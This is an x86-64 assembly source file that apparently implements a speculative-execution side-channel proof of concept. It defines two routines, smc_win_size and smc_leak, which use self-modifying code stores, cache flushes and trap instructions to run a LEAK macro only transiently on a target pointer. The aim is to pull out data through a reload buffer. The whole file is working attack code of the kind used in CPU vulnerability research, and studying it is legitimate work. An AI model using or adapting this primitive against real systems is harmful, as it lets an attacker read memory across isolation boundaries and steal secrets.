%include "common.S"

section .text
default rel

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; smc_win_size(uint8_t *reload_buffer)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global smc_win_size
align 0x1000
smc_win_size:
    push    r15
    
    ;Backup
    mov     rax, qword [smc_win_size_target]
    push    rax
    SERIALIZE

    ;Make harder the SMC detection
    lea     r15, [smc_win_size_target]
    clflush [r15]   ;TWEAK
    %rep 32 
    imul    r15, 1
    %endrep

    ;SMC store to nop out the jmp to speculative code
    mov     rax, 0x9090909090909090 ;8x nop
    mov     QWORD [r15], rax

smc_win_size_target:
    jmp     smc_win_size_spec
    %rep 64
    nop
    %endrep

smc_win_size_arch:
    ;Restore
    pop     rax
    mov     qword [smc_win_size_target], rax
    pop     r15
    ret

;Never executed code (architecturally)
smc_win_size_spec:
    LOADS   rdi
    ud2         ;Be sure that this code is executed only speculatively

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; smc_leak(uint8_t *reload_buffer, uint8_t *leak_ptr)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global smc_leak
align 0x1000
smc_leak:
    push    r14
    push    r15
    
    ;Backup
    mov     rax, qword [smc_leak_spec]
    push    rax

    lea     r14, [smc_leak_spec]
    lea     r15, [smc_leak_arch]

    %rep 16         ;TWEAK
    imul    r14, 1
    %endrep
    mov     dword [r14], 0xe7ff4190 ;jmp r15 

smc_leak_spec:
    LEAK    rdi, rsi
    jmp     smc_leak_spec   ;Be sure that this code is executed only speculatively

smc_leak_arch:
    ;Restore
    pop     rax
    mov     qword [smc_leak_spec], rax
    mfence
    pop     r15
    pop     r14
    ret
